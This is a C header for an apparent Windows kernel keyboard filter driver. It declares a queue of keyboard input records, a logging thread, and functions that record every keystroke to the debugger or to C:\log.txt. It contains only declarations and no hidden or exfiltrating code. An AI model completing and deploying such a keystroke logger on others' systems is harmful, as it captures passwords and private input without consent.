#pragma once
#include "BlockingQueue.h"
#include <Ntddkbd.h>

// Structure for a doubly linked list containing KEYBOARD_INPUT_DATA for the blocking queue.
typedef struct KbdListData {
	LIST_ENTRY list;
	KEYBOARD_INPUT_DATA data;
}KbdListData;

// Blocking queue to process the KEYBOARD_INPUT_DATA of keystrokes.
extern BlockingQueue kbdInputQueue;

// Starts the logging thread.
// The driver will not unload before this thread has not finished.
//
// Parameters:
//
// [in] pDriverObject:
// Address of the driver object of the current driver.
// 
// Return:
// An appropriate NTSTATUS value.
NTSTATUS startLogThread(PDRIVER_OBJECT pDriverObject);

// ThreadStart routine for the logging thread.
// Creates a log file at C:\log.txt and logs all keystrokes to this file until the bocking queue is signaled to stop waiting ans empty.
// Releases the file only on return.
//
// Parameters:
// [in] pStartContext:
// Unused.
void logStartRoutine(PVOID pStartContext);

// Logs a KEYBOARD_INPUT_DATA stucture to the debugger.
//
// Parameters:
// 
// [in] pKbdInputData:
// Address of the KEYBOARD_INPUT_DATA stucture to log.
void logKbdToDbg(PKEYBOARD_INPUT_DATA pKbdInputData);

// Logs a KEYBOARD_INPUT_DATA stucture to a file.
//
// Parameters:
// 
// [in] pKbdInputData:
// Address of the KEYBOARD_INPUT_DATA stucture to log.
//
// [in]
// Handle to the log file. Needs FILE_WRITE_DATA acces rights.
NTSTATUS logKbdToFile(PKEYBOARD_INPUT_DATA pKbdInputData, HANDLE hFile);